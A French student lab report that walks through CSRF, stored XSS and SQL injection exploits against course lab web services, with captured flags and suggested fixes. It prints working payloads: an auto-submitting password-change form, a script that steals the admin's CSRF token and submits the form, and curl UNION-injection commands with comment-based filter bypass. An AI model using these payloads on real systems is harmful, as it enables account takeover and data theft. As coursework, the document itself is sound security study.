# Rapport de Sécurité : SLH 2024-2025 Lab 1

## 1. Introduction

Dans ce rapport, nous documentons les vulnérabilités découvertes et exploitées sur différents services web dans le cadre du laboratoire SLH 2024-2025. Chaque section présente une analyse détaillée des failles CSRF, XSS et SQLi, ainsi que les méthodes employées pour contourner les protections et obtenir les flags.

### Explication des différences entre CSRF et XSS

1. **CSRF (Cross-Site Request Forgery)** :
   - Le CSRF permet à un attaquant de forcer un utilisateur (ici, l’administrateur) à exécuter une requête qu'il n'a pas souhaitée. Cette attaque se produit généralement via un lien ou un formulaire soumis automatiquement (par exemple via JavaScript) sur une page où l'utilisateur est déjà authentifié. Dans ton cas, tu utilises un formulaire pour changer le mot de passe de l'administrateur en l'exécutant sans qu'il en soit conscient, profitant de l’absence de protection CSRF sur le site.
   - La **payload JavaScript** pour le CSRF a pour but de soumettre un formulaire, ce qui change le mot de passe de l'admin à son insu.

2. **XSS (Cross-Site Scripting)** :
   - Le XSS permet à un attaquant d’injecter du contenu malveillant (souvent du JavaScript) dans une page web qui sera ensuite exécuté par un autre utilisateur (dans ce cas, l’administrateur). Il peut s’agir d’un message, d’un commentaire ou d’un autre point d'entrée utilisateur vulnérable qui accepte du contenu non filtré. Ici, tu exploites le formulaire de message pour injecter du JavaScript qui sera exécuté lorsque l’administrateur ouvrira le message.
   - La **payload JavaScript** pour le XSS est conçue pour être stockée et exécutée quand un autre utilisateur (l'admin) interagit avec la page vulnérable.

### Pourquoi les payloads JavaScript sont similaires ?

Dans ton cas, les payloads JavaScript se ressemblent parce que leur objectif final est identique : soumettre un formulaire qui va changer le mot de passe de l'administrateur. Cependant, la **manière dont elles sont utilisées** est différente :

- **Dans le cas du CSRF**, la payload JavaScript est exécutée automatiquement via un lien ou une page malveillante, sans interaction de l'utilisateur cible (l'admin). Par exemple, si l’administrateur clique sur un lien malveillant, la requête est exécutée automatiquement.
  
- **Dans le cas du Stored XSS**, la payload JavaScript est injectée dans un message ou un autre contenu qui sera stocké par le site. Lorsque l'administrateur ouvre le message ou affiche la page où la payload a été injectée, le script est exécuté. Ici, la faille repose sur l'injection de code non filtré dans la page.

### Résumé des différences

- **CSRF** : L'attaque est exécutée à distance et ne nécessite pas que l’administrateur interagisse avec la page vulnérable, mais seulement qu'il soit connecté.
  
- **XSS** : L'attaque repose sur l'injection de code JavaScript dans une page que l’administrateur va consulter. Le code est exécuté quand il ouvre cette page, ce qui rend la vulnérabilité exploitable.

---

## 2. CSRF Simple

### 2.1. Identification de la fonctionnalité vulnérable

- **Description** : En inspectant les requêtes HTTP via les outils de développement, nous avons découvert un formulaire de modification de mot de passe. Ce formulaire permet aux utilisateurs de changer leur mot de passe en soumettant une requête POST. Cependant, il ne comportait aucun mécanisme de protection contre les attaques CSRF, ce qui rend cette fonctionnalité vulnérable.
  
- **Explication** : L'absence de jeton anti-CSRF dans ce formulaire permet à un attaquant de préparer une requête qui, si exécutée par l'administrateur, modifie son mot de passe sans son consentement. C'est une faille classique de type CSRF (Cross-Site Request Forgery), où l'attaquant peut exploiter les actions d'un utilisateur connecté à son insu.

### 2.2. Requête pour prendre le contrôle de l’admin

- **Requête CSRF** :

```html
<form name="CSRFExploit" method="post" action="profile/ouweis.harun_admin"> 
  <input type="hidden" name="password" value="Ouweisgg"> 
</form>
```

- **Explication** : Cette requête est un formulaire caché qui modifie le mot de passe de l’administrateur. Le formulaire soumet une requête POST au serveur, envoyant le nouveau mot de passe "Ouweisgg" sans que l'administrateur n'en soit conscient. Le changement de mot de passe est effectué en raison de l'absence de protection CSRF, ce qui permet à cette requête d'être validée comme si elle provenait légitimement de l'administrateur.

### 2.3. Payload JavaScript pour exécuter la requête

- **Payload JavaScript** :

```html
<script>
  document.CSRFExploit.submit();
</script>
```

- **Explication** : Cette payload JavaScript exécute automatiquement la requête CSRF en soumettant le formulaire caché sans interaction de l'administrateur. Le script appelle la méthode `submit()` du formulaire nommé "CSRFExploit", ce qui déclenche l'envoi de la requête POST pour modifier le mot de passe. L'administrateur n'aura aucune indication que cette action a été effectuée, car cela se passe en arrière-plan.

### 2.4. Exploitation via une faille Stored XSS

- **Fonctionnalité vulnérable à XSS** : La fonctionnalité qui permet d'envoyer un message à l'administrateur est vulnérable à une faille Stored XSS. En utilisant ce vecteur, un attaquant peut insérer du code JavaScript malveillant qui sera stocké par le serveur et exécuté par l’administrateur lorsqu’il visualise le message.

- **Payload XSS** :

```html
<script>
  document.CSRFExploit.submit();
</script>
```

- **Explication** : Nous avons injecté cette payload JavaScript dans le message destiné à l’administrateur. Lorsqu’il ouvre le message, le script est exécuté et soumet le formulaire CSRF pour changer son mot de passe à son insu. Cette attaque fonctionne parce que le serveur n’assainit pas correctement les entrées avant de les stocker et de les afficher, permettant l’exécution de scripts malveillants.

### 2.5. Flag et correction

- **Flag** : Le flag a pu être trouvé en cliquant sur la page admin, lorsque nous sommes connectés en tant qu'admin.
  - Message obtenu : `Congratulation ! You flag is : lyf7ZPopOetX/a4V`
- **Solution** : Voici quelques suggestions brèves et perspicaces pour corriger les vulnérabilités :

1. **Protection contre CSRF** :
   - **Implémenter des jetons anti-CSRF** dans tous les formulaires critiques. Chaque requête POST doit inclure un jeton unique, validé côté serveur.

2. **Filtrage des entrées pour XSS** :
   - **Échapper les entrées utilisateur** avant de les stocker ou afficher. Cela empêche l'exécution de code JavaScript injecté dans les pages.

3. **En-têtes de sécurité** :
   - Utiliser les en-têtes **Content-Security-Policy (CSP)** pour limiter l'exécution de scripts non autorisés, et **X-Content-Type-Options** pour empêcher le traitement incorrect de fichiers.

Ces mesures renforcent la sécurité contre CSRF et XSS en bloquant les vecteurs d'attaque courants.

**Message entier envoyé à l'admin :**

```html
<html>
  <body>
    <form name="CSRFExploit" method="post" action="profile/ouweis.harun_admin"> 
      <input type="password" name="password" value="Ouweisgg"> 
    </form>
    <script>
      document.CSRFExploit.submit() 
    </script>
```

## 3. CSRF Avancée

### 3.1. Fonctionnement d’un jeton anti-CSRF

- **Description** :  Un **jeton anti-CSRF** est un identifiant unique généré côté serveur et inclus dans chaque formulaire pour empêcher les attaques CSRF. Il est envoyé avec la requête POST et validé par le serveur. Si le jeton est absent ou incorrect, la requête est rejetée.

### 3.2. Détection d’un jeton anti-CSRF

- **Vérification** : En inspectant le formulaire HTML, on peut rechercher un champ caché contenant un jeton, souvent nommé `_csrf` ou similaire. Ce champ contient une valeur unique qui doit être envoyée avec le formulaire, comme le champ suivant trouvé lors de l'inspection :

   ```html
   <input type="hidden" name="_csrf" value="KxlHVsPc-MJDAQgLKDX0rxmhX5ZtlRQOEH20">
   ```

### 3.3. Exploitation XSS et Flag

- **XSS** : Nous avons exploité une vulnérabilité XSS en injectant un script malveillant dans une page accessible par l'administrateur. Ce script, une fois exécuté par l'administrateur lorsqu'il ouvre la page contenant notre injection, a récupéré dynamiquement le jeton CSRF de la page de modification de mot de passe. Ensuite, ce même script a utilisé le jeton récupéré pour soumettre une requête POST, modifiant le mot de passe de l’administrateur sans qu’il ne s’en aperçoive. Grâce à cette attaque, nous avons pu obtenir les droits administratifs sur le site.
- **Flag** : Le flag a pu être trouvé en cliquant sur la page admin, lorsque nous sommes connectés en tant qu'admin.
  - Message obtenu : `Congratulation ! You flag is : fTNx2CbPtkdv36wm`

### 3.4. Solution pour corriger la vulnérabilité

- **Solution** :
  - XSS : Assainir toutes les entrées utilisateur en échappant les caractères spéciaux (<, >, "), pour empêcher l'exécution de code JavaScript malveillant.
  - CSRF : S'assurer que tous les formulaires sensibles incluent un jeton anti-CSRF unique et que le serveur valide systématiquement ces jetons avant de traiter les requêtes.

**Message entier envoyé à l'admin :**

```html
<html>
  <body>
    <form name="CSRFExploit" method="post" action="profile/ouweis.harun_admin"> 
      <input type="password" name="password" value="Ouweisgg">
      <input type="hidden" name="_csrf" id="csrf_token" value="">
    </form>
    <script>
      // Étape 1 : Envoyer une requête pour accéder à la page de modification de mot de passe de l'admin
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "/profile/ouweis.harun_admin", true);  // URL de la page de modification
      xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
          // Étape 2 : Extraire le token CSRF de la réponse HTML
          var parser = new DOMParser();
          var doc = parser.parseFromString(xhr.responseText, "text/html");
          var csrfToken = doc.querySelector('input[name="_csrf"]').value;

          // Étape 3 : Insérer dynamiquement le jeton CSRF dans le formulaire
          document.getElementById("csrf_token").value = csrfToken;

          // Étape 4 : Soumettre automatiquement le formulaire une fois le token inséré
          document.CSRFExploit.submit();
        }
      };
      xhr.send();
    </script>
  </body>
</html>
```

## 4. Injection SQL

### 1. Quelle partie de l'application est-elle vulnérable à une injection SQL ?

**Réponse** : La vulnérabilité à l'injection SQL se trouve dans le champ "id" du JSON envoyé à l'URL `http://sql.slh.cyfr.ch/flowers`. En utilisant une requête POST, nous pouvons injecter des requêtes SQL via ce champ pour manipuler les résultats de la base de données.

### 2. Le serveur implémente-t-il une forme de validation des entrées ? Pourquoi est-ce insuffisant dans ce cas ?

**Réponse** : Le serveur utilise une validation de base, mais elle est insuffisante car il ne filtre pas les caractères spéciaux comme `/` et `*`. Ces caractères peuvent être utilisés pour contourner les restrictions de validation et injecter des requêtes SQL valides, rendant l'application vulnérable à des attaques.

### 3. Quel est le flag ? Comment l'avez-vous obtenu ?

**Réponse** : Le flag est : `SLH25{D0N7_P4r53_5Q1_M4NU411Y}`. Nous avons obtenu le flag en exécutant les commandes suivantes dans le terminal :

1. **Récupération des tables dans la base de données** :

   - Nous avons d'abord envoyé une requête POST avec la commande suivante :

   ```bash
   curl -X POST http://sql.slh.cyfr.ch/flowers \
   -H "Content-Type: application/json" \
   -d '{"id":"1/**/UNION/**/SELECT/**/type,/**/name,/**/tbl_name,/**/rootpage/**/FROM/**/sqlite_master"}'
   ```

   - Cette requête utilise l'injection SQL pour interroger la table `sqlite_master`, qui contient les métadonnées des tables de la base de données. Grâce à l'opérateur `UNION`, nous avons pu combiner les résultats de la requête originale avec ceux de la table `sqlite_master`. La réponse obtenue a révélé les tables présentes dans la base de données, dont `super_secret_stuff` et `flowers`.

2. **Récupération du flag** :

   - Après avoir identifié la table contenant le flag, nous avons exécuté la commande suivante :

   ```bash
   curl -X POST http://sql.slh.cyfr.ch/flowers \
   -H "Content-Type: application/json" \
   -d '{"id":"1/**/UNION/**/SELECT/**/name,/**/value,/**/value,/**/value/**/FROM/**/super_secret_stuff"}'
   ```

   - Ici, nous avons à nouveau utilisé l'injection SQL pour interroger la table `super_secret_stuff`. Cette commande permet de récupérer les colonnes `name` et `value`, où le flag est stocké. La réponse reçue contenait le flag sous la forme :

   ```json
   [
       [1, "Rose", "Red", 5],
       ["flag", "SLH25{D0N7_P4r53_5Q1_M4NU411Y}", "SLH25{D0N7_P4r53_5Q1_M4NU411Y}", "SLH25{D0N7_P4r53_5Q1_M4NU411Y}"]
   ]
   ```

Ainsi, en utilisant ces deux requêtes injectées, nous avons pu obtenir le flag directement à partir de la base de données.

### 4. Quel est le DBMS utilisé ? Qu'est-ce qui aurait changé dans l'attaque s'il s'agissait d'un DBMS différent ?

**Réponse** : Le DBMS utilisé est SQLite. Si nous avions utilisé un autre DBMS, comme MySQL ou PostgreSQL, les tables et les commandes pour interroger les métadonnées auraient été différentes. Par exemple, dans MySQL, nous aurions utilisé des requêtes comme `SHOW TABLES` ou `INFORMATION_SCHEMA.TABLES` pour explorer la structure de la base de données, ce qui nécessite une adaptation de l'approche d'attaque.

---
